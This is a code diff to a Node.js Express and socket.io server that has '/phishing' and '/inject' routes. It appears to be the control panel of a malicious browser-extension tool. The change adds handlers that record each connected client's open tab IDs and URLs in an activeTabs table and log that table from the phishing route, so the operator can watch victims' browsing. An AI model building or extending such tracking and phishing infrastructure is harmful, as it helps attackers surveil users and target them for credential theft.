@@ -273,6 +273,13 @@ app.get('/phishing',
     res.render("phishing");
   });
 
+app.post('/phishing',
+  require('connect-ensure-login').ensureLoggedIn(),
+  function(req, res) {
+    console.log(activeTabs);
+    res.redirect("phishing");
+  });
+
 app.post('/inject',
   require('connect-ensure-login').ensureLoggedIn(),
   function(req, res) {
@@ -286,7 +293,7 @@ app.post('/inject',
 
 server.listen(3000);
 console.log("Listening on port 3000");
-
+activeTabs = {};
 
 io.on('connection', (socket) => {
   socket.on("userData", (userData) => {
@@ -359,6 +366,15 @@ io.on('connection', (socket) => {
       //
       //console.log("    " + field);
       //});
+    });
+    socket.on('Removed Tab', (tab)=>{
+      delete activeTabs[tab['tabId']]
+    });
+    socket.on('Updated Tab', (tab)=>{
+      if(tab['tab']['status'] == 'complete' && tab['tab']['url'] != null){
+        activeTabs[tab['tab']['id']] = tab['tab']['url'];
+      }
+
     });
     socket.on('disconnect', () => {
       console.log("User Disconnected");
